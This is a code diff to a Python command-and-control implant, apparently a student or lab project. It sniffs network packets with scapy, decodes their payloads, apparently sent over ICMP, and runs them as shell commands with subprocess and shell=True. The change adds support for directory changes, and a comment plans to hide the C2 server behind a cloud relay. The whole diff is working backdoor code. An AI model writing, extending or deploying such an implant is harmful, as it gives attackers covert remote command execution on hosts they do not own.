@@ -6,6 +6,8 @@
 # Look into platform as a service things (for the waaay future) for getting rnadom domains it would point to a cloud machine (university envir could be on the cloud) with firewall rules then the c2 server is behind the cloud machine
 from scapy.all import AsyncSniffer, Packet
 import subprocess
+import os
+import re
 from time import sleep
 
 
@@ -14,11 +16,15 @@ def sniffHandle(packet: Packet) -> None:
     try:
         decodedCommand = packet[3].load.decode()
         print(decodedCommand)
+        cd_match = re.match(r"^cd\s*(.*)$", decodedCommand)
 
         if decodedCommand == "kill":
             raise Exception("Programmed killed by server")
         elif decodedCommand == "abcdefghijklmnopqrstuvwabcdefghi":
             pass
+        elif cd_match:
+            path = cd_match.group(1)
+            os.chdir(path=path)
         else:
             subprocess.run(decodedCommand, shell=True)
     except UnicodeDecodeError:
